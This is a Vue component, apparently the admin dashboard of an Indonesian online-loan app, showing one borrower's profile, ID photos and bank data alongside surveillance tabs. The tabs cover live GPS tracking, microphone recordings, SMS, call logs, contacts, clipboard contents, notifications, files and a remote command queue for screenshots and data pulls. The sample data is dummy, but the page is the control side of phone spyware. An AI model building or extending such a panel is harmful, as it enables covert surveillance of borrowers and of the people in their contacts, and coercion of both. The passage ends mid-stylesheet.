<template>
  <div class="user-detail-container">
    <div class="header">
      <button @click="goBack" class="back-btn">← Kembali</button>
      <h1>Detail User</h1>
    </div>
    
    <div v-if="user" class="user-info">
      <!-- User Basic Info -->
      <div class="info-card">
        <h2>Detail User</h2>
        <div class="info-grid">
          <div class="info-item">
            <label>Nama:</label>
            <span>{{ user.name }}</span>
          </div>
          <div class="info-item">
            <label>Phone:</label>
            <a :href="`https://wa.me/${user.phone.replace(/[^0-9]/g, '')}`" target="_blank" class="phone-link">
              {{ user.phone }}
              <span class="whatsapp-icon">📱</span>
            </a>
          </div>
          <div class="info-item">
            <label>Email:</label>
            <span>{{ user.email }}</span>
          </div>
          <div class="info-item">
            <label>IMEI:</label>
            <span>{{ user.imei }}</span>
          </div>
          <div class="info-item">
            <label>Status:</label>
            <span :class="['status', user.status]">{{ user.status }}</span>
          </div>
          <div class="info-item">
            <label>Device:</label>
            <span>{{ user.device }}</span>
          </div>
        </div>
      </div>

      <!-- Form Data Info -->
      <div v-if="user.formData" class="info-card">
        <h2>Detail User (Data Formulir)</h2>
        <div class="form-info">
          <div class="form-section">
            <h3>Informasi Pribadi</h3>
            <div class="form-grid">
              <div class="form-item">
                <label>Nama Lengkap:</label>
                <span>{{ user.formData.fullName }}</span>
              </div>
              <div class="form-item">
                <label>Tanggal Lahir:</label>
                <span>{{ user.formData.dateOfBirth }}</span>
              </div>
              <div class="form-item">
                <label>Jenis Kelamin:</label>
                <span>{{ user.formData.gender }}</span>
              </div>
              <div class="form-item">
                <label>Status Perkawinan:</label>
                <span>{{ user.formData.maritalStatus }}</span>
              </div>
              <div class="form-item">
                <label>Provinsi:</label>
                <span>{{ user.formData.province }}</span>
              </div>
              <div class="form-item">
                <label>Kota/Kabupaten:</label>
                <span>{{ user.formData.city }}</span>
              </div>
              <div class="form-item">
                <label>Kecamatan:</label>
                <span>{{ user.formData.district }}</span>
              </div>
              <div class="form-item">
                <label>Kelurahan:</label>
                <span>{{ user.formData.subDistrict }}</span>
              </div>
              <div class="form-item full-width">
                <label>Alamat Jalan:</label>
                <span>{{ user.formData.streetAddress }}</span>
              </div>
            </div>
          </div>
          
          <div class="form-section">
            <h3>Kontak Darurat 1</h3>
            <div class="form-grid">
              <div class="form-item">
                <label>Nama:</label>
                <span>{{ user.formData.emergencyContact1Name }}</span>
              </div>
              <div class="form-item">
                <label>Telepon:</label>
                <span>{{ user.formData.emergencyContact1Phone }}</span>
              </div>
              <div class="form-item">
                <label>Hubungan:</label>
                <span>{{ user.formData.emergencyContact1Relationship }}</span>
              </div>
            </div>
          </div>
          
          <div class="form-section">
            <h3>Kontak Darurat 2</h3>
            <div class="form-grid">
              <div class="form-item">
                <label>Nama:</label>
                <span>{{ user.formData.emergencyContact2Name }}</span>
              </div>
              <div class="form-item">
                <label>Telepon:</label>
                <span>{{ user.formData.emergencyContact2Phone }}</span>
              </div>
              <div class="form-item">
                <label>Hubungan:</label>
                <span>{{ user.formData.emergencyContact2Relationship }}</span>
              </div>
            </div>
          </div>
          
          <div class="form-section">
            <h3>Informasi Bank</h3>
            <div class="form-grid">
              <div class="form-item">
                <label>Nama Bank:</label>
                <span>{{ user.formData.bankName }}</span>
              </div>
              <div class="form-item">
                <label>Nama Pemilik Rekening:</label>
                <span>{{ user.formData.accountName }}</span>
              </div>
              <div class="form-item">
                <label>Nomor Rekening:</label>
                <span>{{ user.formData.accountNumber }}</span>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- Produk Pinjaman -->
      <div v-if="user.loanProduct" class="info-card">
        <h2>Produk Pinjaman</h2>
        <div class="loan-info">
          <div class="loan-item">
            <label>Produk:</label>
            <span>{{ user.loanProduct.productName }}</span>
          </div>
          <div class="loan-item">
            <label>Jumlah Pinjaman:</label>
            <span>Rp {{ user.loanProduct.amount?.toLocaleString() }}</span>
          </div>
          <div class="loan-item">
            <label>Tenor:</label>
            <span>{{ user.loanProduct.tenor }} bulan</span>
          </div>
          <div class="loan-item">
            <label>Bunga:</label>
            <span>{{ user.loanProduct.interestRate }}%</span>
          </div>
          <div class="loan-item">
            <label>Status:</label>
            <span :class="['status', getApprovalStatusText(user.loanProduct.status)]">
              {{ getApprovalStatusText(user.loanProduct.status) }}
            </span>
          </div>
          <div class="loan-item">
            <label>Tanggal Pengajuan:</label>
            <span>{{ user.loanProduct.applicationDate }}</span>
          </div>
        </div>
      </div>

      <!-- Document Photos -->
      <div class="info-card">
        <h2>Dokumen</h2>
        <div class="document-section">
          <div class="document-item">
            <h3>Foto KTP</h3>
            <img 
              :src="`/api/photos/${user.id}/ktp`" 
              :alt="'KTP ' + user.name"
              class="document-photo"
              :key="`ktp-${user.id}-${Date.now()}`"
              @load="imageLoaded"
              @error="imageError"
            />
          </div>
          <div class="document-item">
            <h3>Foto Selfie</h3>
            <img 
              :src="`/api/photos/${user.id}/selfie`" 
              :alt="'Selfie ' + user.name"
              class="document-photo"
              :key="`selfie-${user.id}-${Date.now()}`"
              @load="imageLoaded"
              @error="imageError"
            />
          </div>
        </div>
      </div>

      <!-- Monitoring Tabs -->
      <div class="info-card">
        <h2>Monitoring</h2>
        <div class="tabs">
          <button 
            v-for="tab in tabs" 
            :key="tab.id"
            :class="['tab', { active: activeTab === tab.id }]"
            @click="activeTab = tab.id"
          >
            {{ tab.name }}
          </button>
        </div>

        <!-- GPS Logging -->
        <div v-if="activeTab === 'gps'" class="tab-content">
          <div class="gps-map">
            <h4>GPS Location History - Real Time</h4>
            <div id="map" class="map-container"></div>
            <div class="current-location">
              <p><strong>Current Location:</strong> Latitude: {{ gpsData[0]?.lat }}, Longitude: {{ gpsData[0]?.lon }}</p>
            </div>
            <div class="table-container">
              <table>
                <thead>
                  <tr>
                    <th>Waktu</th>
                    <th>Latitude</th>
                    <th>Longitude</th>
                    <th>Alamat</th>
                    <th>Action</th>
                  </tr>
                </thead>
                <tbody>
                  <tr v-for="(location, index) in gpsData" :key="index">
                    <td>{{ location.time }}</td>
                    <td>{{ location.lat }}</td>
                    <td>{{ location.lon }}</td>
                    <td>{{ location.address }}</td>
                    <td>
                      <button @click="centerMap(location.lat, location.lon)" class="map-btn">
                        📍 Show on Map
                      </button>
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>
        </div>

        <!-- Microphone -->
        <div v-if="activeTab === 'mic'" class="tab-content">
          <h4>Microphone Recordings</h4>
          <div class="table-container">
            <table>
              <thead>
                <tr>
                  <th>Waktu</th>
                  <th>File</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="(recording, index) in micData" :key="index">
                  <td>{{ recording.time }}</td>
                  <td>{{ recording.file }}</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>

        <!-- Contacts -->
        <div v-if="activeTab === 'contacts'" class="tab-content">
          <h4>Contact List</h4>
          <div class="table-container">
            <table>
              <thead>
                <tr>
                  <th>Nama</th>
                  <th>Telepon</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="(contact, index) in contactsData" :key="index">
                  <td>{{ contact.name }}</td>
                  <td>{{ contact.phone }}</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>

        <!-- SMS -->
        <div v-if="activeTab === 'sms'" class="tab-content">
          <h4>SMS Messages</h4>
          <div class="table-container">
            <table>
              <thead>
                <tr>
                  <th>Tipe</th>
                  <th>Nomor</th>
                  <th>Pesan</th>
                  <th>Waktu</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="(sms, index) in smsData" :key="index">
                  <td>{{ sms.type }}</td>
                  <td>{{ sms.number }}</td>
                  <td>{{ sms.message }}</td>
                  <td>{{ sms.time }}</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>

        <!-- Call Log -->
        <div v-if="activeTab === 'calls'" class="tab-content">
          <h4>Call History</h4>
          <div class="table-container">
            <table>
              <thead>
                <tr>
                  <th>Tipe</th>
                  <th>Nomor</th>
                  <th>Durasi</th>
                  <th>Waktu</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="(call, index) in callData" :key="index">
                  <td>{{ call.type }}</td>
                  <td>{{ call.number }}</td>
                  <td>{{ call.duration }}s</td>
                  <td>{{ call.time }}</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>

        <!-- Installed Apps -->
        <div v-if="activeTab === 'apps'" class="tab-content">
          <h4>Installed Applications</h4>
          <div class="table-container">
            <table>
              <thead>
                <tr>
                  <th>Aplikasi</th>
                  <th>Package</th>
                  <th>Versi</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="(app, index) in appsData" :key="index">
                  <td>{{ app.app }}</td>
                  <td>{{ app.package }}</td>
                  <td>{{ app.version }}</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>

        <!-- Permissions -->
        <div v-if="activeTab === 'permissions'" class="tab-content">
          <h4>App Permissions</h4>
          <div class="table-container">
            <table>
              <thead>
                <tr>
                  <th>Permission</th>
                  <th>Status</th>
                  <th>Update</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="(perm, index) in permData" :key="index">
                  <td>{{ perm.permission }}</td>
                  <td>{{ perm.status ? 'Granted' : 'Denied' }}</td>
                  <td>{{ perm.updated }}</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>

        <!-- Clipboard -->
        <div v-if="activeTab === 'clipboard'" class="tab-content">
          <h4>Clipboard History</h4>
          <ul class="data-list">
            <li v-for="(item, index) in clipboardData" :key="index">{{ item }}</li>
          </ul>
        </div>

        <!-- Notifications -->
        <div v-if="activeTab === 'notifications'" class="tab-content">
          <h4>Notification History</h4>
          <ul class="data-list">
            <li v-for="(notif, index) in notifData" :key="index">{{ notif }}</li>
          </ul>
        </div>

        <!-- WiFi -->
        <div v-if="activeTab === 'wifi'" class="tab-content">
          <h4>WiFi Networks</h4>
          <div class="table-container">
            <table>
              <thead>
                <tr>
                  <th>SSID</th>
                  <th>Waktu</th>
                  <th>Lokasi</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="(wifi, index) in wifiData" :key="index">
                  <td>{{ wifi.ssid }}</td>
                  <td>{{ wifi.time }}</td>
                  <td>{{ wifi.location }}</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>

        <!-- Files -->
        <div v-if="activeTab === 'files'" class="tab-content">
          <h4>File Explorer</h4>
          <div class="table-container">
            <table>
              <thead>
                <tr>
                  <th>Path</th>
                  <th>Ukuran</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="(file, index) in fileData" :key="index">
                  <td>{{ file.path }}</td>
                  <td>{{ file.size }}</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>

        <!-- Commands -->
        <div v-if="activeTab === 'commands'" class="tab-content">
          <h4>Command Queue</h4>
          <div class="table-container">
            <table>
              <thead>
                <tr>
                  <th>Perintah</th>
                  <th>Status</th>
                  <th>Waktu</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>GET_LOCATION</td>
                  <td>Completed</td>
                  <td>2025-08-03 16:58:41</td>
                </tr>
                <tr>
                  <td>GET_CONTACTS</td>
                  <td>Completed</td>
                  <td>2025-08-03 16:57:30</td>
                </tr>
                <tr>
                  <td>GET_SMS</td>
                  <td>Completed</td>
                  <td>2025-08-03 16:56:15</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>

      <!-- Activity History -->
      <div class="info-card">
        <h2>Riwayat Aktivitas</h2>
        <div class="activity-list">
          <div v-for="(activity, index) in activities" :key="index" class="activity-item">
            <div class="activity-time">{{ activity.time }}</div>
            <div class="activity-desc">{{ activity.description }}</div>
          </div>
        </div>
      </div>
    </div>

    <div v-else class="loading">
      <p>Loading user data...</p>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted, nextTick } from 'vue'
import { useRouter, useRoute } from 'vue-router'

const router = useRouter()
const route = useRoute()
const user = ref(null)

// Dummy activity data
const activities = ref([
  { time: '2025-08-03 08:40', description: 'User login ke aplikasi' },
  { time: '2025-08-03 08:35', description: 'GPS location updated' },
  { time: '2025-08-03 08:30', description: 'SMS sync completed' },
  { time: '2025-08-03 08:25', description: 'Contact list updated' },
  { time: '2025-08-03 08:20', description: 'App usage data collected' }
])

// Monitoring data
const gpsData = ref([
  { time: '2025-08-03 16:58:41', lat: -6.218252, lon: 106.817175, address: 'Pindah, Jakarta' },
  { time: '2025-08-03 16:57:30', lat: -6.218100, lon: 106.817000, address: 'Pindah, Jakarta' },
  { time: '2025-08-03 16:56:15', lat: -6.217900, lon: 106.816800, address: 'Pindah, Jakarta' },
  { time: '2025-08-03 16:55:22', lat: -6.217700, lon: 106.816600, address: 'Pindah, Jakarta' },
  { time: '2025-08-03 16:54:08', lat: -6.217500, lon: 106.816400, address: 'Pindah, Jakarta' },
  { time: '2025-08-03 16:53:45', lat: -6.217300, lon: 106.816200, address: 'Pindah, Jakarta' },
  { time: '2025-08-03 16:52:33', lat: -6.217100, lon: 106.816000, address: 'Pindah, Jakarta' },
  { time: '2025-08-03 16:51:18', lat: -6.216900, lon: 106.815800, address: 'Pindah, Jakarta' },
  { time: '2025-08-03 16:50:45', lat: -6.216700, lon: 106.815600, address: 'Pindah, Jakarta' },
  { time: '2025-08-03 16:49:56', lat: -6.216500, lon: 106.815400, address: 'Pindah, Jakarta' }
])

const micData = ref([
  { time: '2025-08-03 16:45:12', file: 'recording_001.mp3' },
  { time: '2025-08-03 16:30:45', file: 'recording_002.mp3' },
  { time: '2025-08-03 16:15:22', file: 'recording_003.mp3' }
])

const contactsData = ref([
  { name: 'John Doe', phone: '+6281234567890' },
  { name: 'Jane Smith', phone: '+6281234567891' },
  { name: 'Bob Johnson', phone: '+6281234567892' }
])

const smsData = ref([
  { type: 'Inbox', number: '+6281234567890', message: 'Hello there!', time: '2025-08-03 16:40:12' },
  { type: 'Sent', number: '+6281234567891', message: 'How are you?', time: '2025-08-03 16:35:45' },
  { type: 'Inbox', number: '+6281234567892', message: 'Meeting at 3 PM', time: '2025-08-03 16:30:22' }
])

const callData = ref([
  { type: 'Incoming', number: '+6281234567890', duration: 120, time: '2025-08-03 16:25:12' },
  { type: 'Outgoing', number: '+6281234567891', duration: 85, time: '2025-08-03 16:20:45' },
  { type: 'Missed', number: '+6281234567892', duration: 0, time: '2025-08-03 16:15:22' }
])

const appsData = ref([
  { app: 'WhatsApp', package: 'com.whatsapp', version: '2.23.15.78' },
  { app: 'Instagram', package: 'com.instagram.android', version: '302.0.0.45.107' },
  { app: 'Facebook', package: 'com.facebook.katana', version: '436.0.0.0.107' }
])

const permData = ref([
  { permission: 'android.permission.CAMERA', status: true, updated: '2025-08-03 16:40:12' },
  { permission: 'android.permission.RECORD_AUDIO', status: true, updated: '2025-08-03 16:35:45' },
  { permission: 'android.permission.ACCESS_FINE_LOCATION', status: true, updated: '2025-08-03 16:30:22' }
])

const clipboardData = ref([
  'Hello world!',
  'Meeting at 3 PM tomorrow',
  'Password: 123456'
])

const notifData = ref([
  'WhatsApp: New message from John',
  'Instagram: You have 3 new followers',
  'Gmail: New email received'
])

const wifiData = ref([
  { ssid: 'Home_WiFi', time: '2025-08-03 16:40:12', location: 'Jakarta' },
  { ssid: 'Office_Network', time: '2025-08-03 16:35:45', location: 'Jakarta' },
  { ssid: 'Public_WiFi', time: '2025-08-03 16:30:22', location: 'Jakarta' }
])

const fileData = ref([
  { path: '/storage/emulated/0/Download/file1.pdf', size: '2.5 MB' },
  { path: '/storage/emulated/0/Pictures/photo1.jpg', size: '1.8 MB' },
  { path: '/storage/emulated/0/Documents/doc1.docx', size: '3.2 MB' }
])

const cmdData = ref([
  { command: 'get_location', status: 'Completed', time: '2025-08-03 16:40:12' },
  { command: 'sync_contacts', status: 'Running', time: '2025-08-03 16:35:45' },
  { command: 'take_screenshot', status: 'Pending', time: '2025-08-03 16:30:22' }
])

const goBack = () => {
  router.push('/dashboard')
}

const formatNumber = (num) => {
  return new Intl.NumberFormat('id-ID').format(num)
}

const formatDate = (date) => {
  return new Date(date).toLocaleDateString('id-ID')
}

const getLoanStatusText = (status) => {
  const statusMap = {
    'active': 'Aktif',
    'inactive': 'Tidak Aktif',
    'pending': 'Menunggu',
    'overdue': 'Terlambat'
  }
  return statusMap[status] || status
}

const getApprovalStatusText = (status) => {
  const statusMap = {
    'approved': 'Disetujui',
    'rejected': 'Ditolak',
    'pending': 'Menunggu',
    'overdue': 'Terlambat'
  }
  return statusMap[status] || status
}

const imageLoaded = () => {
  // Image loaded successfully
}

const imageError = () => {
  console.error('Image failed to load');
}

// Monitoring data
const tabs = ref([
  { id: 'gps', name: 'GPS Logging' },
  { id: 'mic', name: 'Microphone Recording' },
  { id: 'contacts', name: 'Contacts' },
  { id: 'sms', name: 'SMS Logs' },
  { id: 'calls', name: 'Call Logs' },
  { id: 'apps', name: 'Installed Apps' },
  { id: 'permissions', name: 'Stub Permissions' },
  { id: 'clipboard', name: 'Clipboard' },
  { id: 'notifications', name: 'Notifications' },
  { id: 'wifi', name: 'WiFi Networks' },
  { id: 'files', name: 'File Explorer' },
  { id: 'commands', name: 'Command Queue' }
]);

const activeTab = ref('gps');

// Initialize tabs functionality
const initializeTabs = () => {
  const tabButtons = document.querySelectorAll('.tab');
  const tabContents = document.querySelectorAll('.tab-content');

  tabButtons.forEach(button => {
    button.addEventListener('click', () => {
      const targetTabId = button.getAttribute('data-tab');
      if (targetTabId) {
        activeTab.value = targetTabId;
      }
    });
  });
}

// Initialize monitoring data
const initializeMonitoringData = () => {
  // renderGpsLog(); // This function is no longer needed as data is directly in template
  // renderMicLog();
  // renderContacts();
  // renderSms();
  // renderCalls();
  // renderApps();
  // renderPerms();
  // renderClipboard();
  // renderNotif();
  // renderWifi();
  // renderFile();
  // renderCmd();
}

// Render functions
// const renderGpsLog = () => {
//   const table = document.getElementById('gps-log-table')
//   if (table) {
//     table.innerHTML = gpsData.value.map(
//       d => `<tr>
//         <td>${d.time}</td>
//         <td>${d.lat}</td>
//         <td>${d.lon}</td>
//         <td>${d.address}</td>
//       </tr>`
//     ).join('')
//   }
// }

// const renderMicLog = () => {
//   const table = document.getElementById('mic-log-table')
//   if (table) {
//     table.innerHTML = micData.value.map(
//       d => `<tr>
//         <td>${d.time}</td>
//         <td><a href="#" onclick="downloadFile('${d.file}')">${d.file}</a></td>
//       </tr>`
//     ).join('')
//   }
// }

// const renderContacts = () => {
//   const table = document.getElementById('contacts-table')
//   if (table) {
//     table.innerHTML = contactsData.value.map(
//       d => `<tr>
//         <td>${d.name}</td>
//         <td>${d.phone}</td>
//       </tr>`
//     ).join('')
//   }
// }

// const renderSms = () => {
//   const table = document.getElementById('sms-table')
//   if (table) {
//     table.innerHTML = smsData.value.map(
//       d => `<tr>
//         <td>${d.type}</td>
//         <td>${d.number}</td>
//         <td>${d.message}</td>
//         <td>${d.time}</td>
//       </tr>`
//     ).join('')
//   }
// }

// const renderCalls = () => {
//   const table = document.getElementById('call-table')
//   if (table) {
//     table.innerHTML = callData.value.map(
//       d => `<tr>
//         <td>${d.type}</td>
//         <td>${d.number}</td>
//         <td>${d.duration}</td>
//         <td>${d.time}</td>
//       </tr>`
//     ).join('')
//   }
// }

// const renderApps = () => {
//   const table = document.getElementById('apps-table')
//   if (table) {
//     table.innerHTML = appsData.value.map(
//       d => `<tr>
//         <td>${d.app}</td>
//         <td>${d.package}</td>
//         <td>${d.version}</td>
//       </tr>`
//     ).join('')
//   }
// }

// const renderPerms = () => {
//   const table = document.getElementById('perm-table')
//   if (table) {
//     table.innerHTML = permData.value.map(
//       d => `<tr>
//         <td>${d.permission}</td>
//         <td><span class="tag ${d.status?'green':'red'}">${d.status?'Granted':'Denied'}</span></td>
//         <td>${d.updated}</td>
//       </tr>`
//     ).join('')
//   }
// }

// const renderClipboard = () => {
//   const list = document.getElementById('clipboard-list')
//   if (list) {
//     list.innerHTML = clipboardData.value.map(
//       d => `<li>${d}</li>`
//     ).join('')
//   }
// }

// const renderNotif = () => {
//   const list = document.getElementById('notif-list')
//   if (list) {
//     list.innerHTML = notifData.value.map(
//       d => `<li>${d}</li>`
//     ).join('')
//   }
// }

// const renderWifi = () => {
//   const table = document.getElementById('wifi-table')
//   if (table) {
//     table.innerHTML = wifiData.value.map(
//       d => `<tr>
//         <td>${d.ssid}</td>
//         <td>${d.time}</td>
//         <td>${d.location}</td>
//       </tr>`
//     ).join('')
//   }
// }

// const renderFile = () => {
//   const table = document.getElementById('file-table')
//   if (table) {
//     table.innerHTML = fileData.value.map(
//       d => `<tr>
//         <td>${d.path}</td>
//         <td>${d.size}</td>
//       </tr>`
//     ).join('')
//   }
// }

// const renderCmd = () => {
//   const table = document.getElementById('cmd-table')
//   if (table) {
//     table.innerHTML = cmdData.value.map(
//       d => `<tr>
//         <td>${d.command}</td>
//         <td>${d.status}</td>
//         <td>${d.time}</td>
//       </tr>`
//     ).join('')
//   }
// }

// Start real-time updates
const startRealtimeUpdates = () => {
  setInterval(() => {
    // Simulate real-time updates
    const newGpsData = {
      time: new Date().toISOString().slice(0, 19).replace('T', ' '),
      lat: -6.218252 + (Math.random() - 0.5) * 0.001,
      lon: 106.817175 + (Math.random() - 0.5) * 0.001,
      address: 'Pindah, Jakarta'
    }
    gpsData.value.unshift(newGpsData)
    if (gpsData.value.length > 10) {
      gpsData.value.pop()
    }
    
    // Update map markers
    updateMapMarkers()
  }, 5000)
}

// Initialize Leaflet map
let map = null
let markers = []

const initializeMap = () => {
  nextTick(() => {
    // Load Leaflet CSS
    if (!document.querySelector('#leaflet-css')) {
      const css = document.createElement('link')
      css.id = 'leaflet-css'
      css.rel = 'stylesheet'
      css.href = 'https://unpkg.com/leaflet/dist/leaflet.css'
      document.head.appendChild(css)
    }

    // Load Leaflet script dynamically
    if (!window.L) {
      const script = document.createElement('script')
      script.src = 'https://unpkg.com/leaflet/dist/leaflet.js'
      script.onload = () => {
        createMap()
      }
      document.head.appendChild(script)
    } else {
      createMap()
    }
  })
}

const createMap = () => {
  const mapElement = document.getElementById('map')
  if (mapElement && window.L) {
    map = window.L.map('map').setView([-6.218252, 106.817175], 15)
    window.L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { 
      maxZoom: 19 
    }).addTo(map)
    
    updateMapMarkers()
  }
}

const updateMapMarkers = () => {
  if (!map || !window.L) return
  
  // Clear existing markers
  markers.forEach(marker => map.removeLayer(marker))
  markers = []
  
  // Add new markers
  gpsData.value.forEach((point, index) => {
    const marker = window.L.marker([point.lat, point.lon]).addTo(map)
    marker.bindPopup(`<b>${point.time}</b><br>${point.address}`)
    markers.push(marker)
    
    if (index === 0) {
      marker.openPopup()
    }
  })
}

const centerMap = (lat, lon) => {
  if (map) {
    map.setView([lat, lon], 16)
  }
}

// Handle SMS form submission
const handleSmsForm = () => {
  nextTick(() => {
    const form = document.getElementById('send-sms-form')
    if (form) {
      form.onsubmit = function(e) {
        e.preventDefault()
        const to = document.getElementById('smsTo').value
        const body = document.getElementById('smsBody').value
        const status = document.getElementById('smsSendStatus')
        
        if (to && body) {
          status.textContent = " (SMS terkirim [simulasi])"
          document.getElementById('smsTo').value = ""
          document.getElementById('smsBody').value = ""
          setTimeout(() => {
            status.textContent = ""
          }, 2000)
        }
      }
    }
  })
}

onMounted(() => {
  // Load user data
  const userId = route.params.phone
  if (userId) {
    // Simulate API call
    user.value = {
      id: userId,
      name: 'Budi Santoso',
      phone: '+6281234567890',
      email: 'budi@example.com',
      imei: '123456789012345',
      status: 'active',
      device: 'Samsung Galaxy S21',
      features: ['GPS', 'Kontak', 'SMS', 'Call', 'App', 'Mic', 'Clipboard'],
      loanProduct: {
        productName: 'Pinjaman Cepat',
        amount: 5000000,
        tenor: 12,
        interestRate: 2.5,
        status: 'active',
        applicationDate: '2025-08-03',
        remainingAmount: 4500000,
        monthlyPayment: 520833
      },
      formData: {
        fullName: 'Budi Santoso',
        dateOfBirth: '1990-01-01',
        gender: 'Laki-laki',
        maritalStatus: 'Belum Kawin',
        province: 'DKI Jakarta',
        city: 'Jakarta Pusat',
        district: 'Gambir',
        subDistrict: 'Gambir',
        streetAddress: 'Jl. Gambir No. 1',
        emergencyContact1Name: 'Ayah Budi',
        emergencyContact1Phone: '+6281234567891',
        emergencyContact1Relationship: 'Ayah',
        emergencyContact2Name: 'Ibu Budi',
        emergencyContact2Phone: '+6281234567892',
        emergencyContact2Relationship: 'Ibu',
        bankName: 'BCA',
        accountName: 'Budi Santoso',
        accountNumber: '1234567890'
      }
    }
  }

  // Initialize tabs functionality
  nextTick(() => {
    initializeTabs()
    initializeMonitoringData()
    startRealtimeUpdates()
    handleSmsForm()
    initializeMap()
  })
})
</script>

<style scoped>
.user-detail-container {
  padding: 20px;
  max-width: 1200px;
  margin: 0 auto;
}

.header {
  display: flex;
  align-items: center;
  gap: 20px;
  margin-bottom: 30px;
}

.back-btn {
  background: #2376e2;
  color: white;
  border: none;
  padding: 10px 20px;
  border-radius: 6px;
  cursor: pointer;
  font-size: 14px;
}

.back-btn:hover {
  background: #1653b7;
}

.header h1 {
  margin: 0;
  color: #2376e2;
}

.user-info {
  display: flex;
  flex-direction: column;
  gap: 20px;
}

.info-card {
  background: white;
  border-radius: 8px;
  padding: 20px;
  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
}

.info-card h2 {
  margin: 0 0 16px 0;
  color: #333;
  font-size: 18px;
  font-weight: 600;
}

.info-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
  gap: 12px;
}

.info-item {
  display: flex;
  justify-content: space-between;
  padding: 8px 0;
  border-bottom: 1px solid #eee;
}

.info-item label {
  font-weight: 500;
  color: #666;
}

.info-item span {
  color: #333;
}

.status {
  padding: 4px 8px;
  border-radius: 4px;
  font-size: 12px;
  font-weight: 500;
}

.status.active {
  background: #d4edda;
  color: #155724;
}

.status.inactive {
  background: #f8d7da;
  color: #721c24;
}

/* Loan Product Styles */
.loan-info {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
  gap: 12px;
}

.loan-item {
  display: flex;
  justify-content: space-between;
  padding: 8px 0;
  border-bottom: 1px solid #eee;
}

.loan-item label {
  font-weight: 500;
  color: #666;
}

.loan-item span {
  color: #333;
  font-weight: 500;
}

.loan-status {
  padding: 4px 8px;
  border-radius: 4px;
  font-size: 12px;
  font-weight: 500;
}

.loan-status.active {
  background: #d4edda;
  color: #155724;
}

.loan-status.overdue {
  background: #f8d7da;
  color: #721c24;
}

.loan-status.pending {
  background: #fff3cd;
  color: #856404;
}

.document-section {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
  gap: 16px;
}

.document-item {
  text-align: center;
}

.document-item h3 {
  margin: 0 0 8px 0;
  color: #333;
  font-size: 16px;
}

.document-photo {
  width: 100%;
  max-width: 200px;
  height: 150px;
  object-fit: cover;
  border-radius: 8px;
  border: 2px solid #eee;
}

/* Dashboard Admin Styles */
.tabs {
  display: flex;
  gap: 8px;
  margin-bottom: 20px;
  flex-wrap: wrap;
  overflow-x: auto;
}

.tab {
  background: #eee;
  padding: 8px 14px;
  border-radius: 6px;
  cursor: pointer;
  transition: all 0.2s ease;
  white-space: nowrap;
  flex-shrink: 0;
}

.tab:hover {
  background: #ddd;
}

.tab.active {
  background: #2376e2;
  color: #fff;
}

.section {
  display: none;
}

.section.active {
  display: block;
}

.section h4 {
  margin: 0 0 16px 0;
  color: #333;
  font-size: 16px;
  font-weight: 600;
}

.realtime {
  color: #00a01a;
  font-weight: bold;
  animation: blink 1.5s infinite;
}

@keyframes blink {
  50% { opacity: 0.2; }
}

/* Map Styles */
.map-container {
  margin-bottom: 20px;
}

.gps-map {
  width: 100%;
  height: 400px;
  border-radius: 8px;
  border: 1px solid #ddd;
  background: #f8f9fa;
  position: relative;
  overflow: hidden;
}

.gps-map::before {
  content: "GPS Map Loading...";
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  color: #666;
  font-size: 14px;
}

/* Table Styles */
.table-container {
  overflow-x: auto;
  margin-bottom: 20px;
}

table {
  width: 100%;
  border-collapse: collapse;
  min-width: 600px;
}

th, td {
  border: 1px solid #ddd;
  padding: 8px 12px;
  text-align: left;
  font-size: 14px;
}

th {
  background: #f5f5f5;
  font-weight: 600;
  position: sticky;
  top: 0;
}

.label {
  font-weight: bold;
  color: #2376e2;
}

.tag {
  padding: 2px 8px;
  border-radius: 4px;
  background: #eee;
  font-size: 0.9em;
}

.tag.green {
  background: #c9f7ce;
  color: #045d1c;
}

.tag.red {
  background: #ffd6d6;
  color: #a80000;
}

/* Form Styles */
.sms-form {
  display: flex;
  flex-wrap: wrap;
  gap: 10px;
  align-items: center;
  margin-bottom: 20px;
}

.form-group {
  flex: 1;
  min-width: 200px;
}

.form-input {
  width: 100%;
  padding: 8px 12px;
  border: 1px solid #ddd;
  border-radius: 4px;
  font-size: 14px;
}

.form-btn {
  background: #2376e2;
  color: white;
  border: none;
  padding: 8px 16px;
  border-radius: 4px;
  cursor: pointer;
  font-size: 14px;
}

.form-btn:hover {
  background: #1653b7;
}

.status-message {
  color: #28a745;
  font-size: 14px;
  margin-left: 10px;
}

/* List Styles */
.data-list {
  list-style: none;
  padding: 0;
  margin: 0;
}

.data-list li {
  padding: 8px 0;
  border-bottom: 1px solid #eee;
  color: #333;
}

.activity-list {
  display: flex;
  flex-direction: column;
  gap: 8px;
}

.activity-item {
  display: flex;
  gap: 12px;
  padding: 8px 0;
  border-bottom: 1px solid #eee;
}

.activity-time {
  font-size: 12px;
  color: #666;
  min-width: 120px;
}

.activity-desc {
  color: #333;
}

.loading {
  text-align: center;
  padding: 40px;
  color: #666;
}

/* Loan Product Styles */
.loan-info {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
  gap: 12px;
}

.loan-item {
  display: flex;
  justify-content: space-between;
  padding: 8px 0;
